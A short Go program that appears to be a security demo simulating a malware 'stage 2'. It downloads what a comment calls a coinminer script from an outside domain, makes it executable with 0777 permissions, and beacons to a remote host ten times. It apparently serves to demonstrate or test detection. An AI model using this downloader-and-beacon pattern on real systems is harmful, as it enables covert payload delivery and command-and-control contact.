package main

import (
	"os"
	"time"
)

var ()

func main() {
	const domain = "lwmalwaredemo.com"
	//const domain = "localhost:8081"
	const filename = "install-demo-1.sh"
	const host = "lacework.ddns.net"
	//const host = "localhost:8080"
	const postUrl = "http://" + host + "/lw-beacon"
	const getUrl = "http://" + domain + "/" + filename
	var body = []byte(`{"stage":"2"}`)

	Log := setupLogger("lw-stage-2.log")

	// download coinminer script
	Log.Println("Downloading file: " + getUrl)
	getErr := httpGet(getUrl, filename)
	if getErr != nil {
		Log.Println("Error downloading file", getErr)
		panic(getErr)
	}

	// make file executable
	chmodErr := os.Chmod(filename, 0777)
	if chmodErr != nil {
		Log.Println("Error changing permissions", chmodErr)
		panic(chmodErr)
	}
	Log.Println("Finished changing permissions for stage 1")

	//wait a few seconds then terminate
	time.Sleep(10 * time.Second)

	// beacon home every 60 seconds 10 times
	for i := range 10 {
		postErr := httpPost(postUrl, body)
		if postErr != nil {
			Log.Println("Error posting beacon to API", postErr)
			panic(postErr)
		}
		Log.Printf("Sending beacon back to API: %d\n", i+1)
		time.Sleep(60 * time.Second)
	}
	Log.Println("Completed. Terminating.")
}
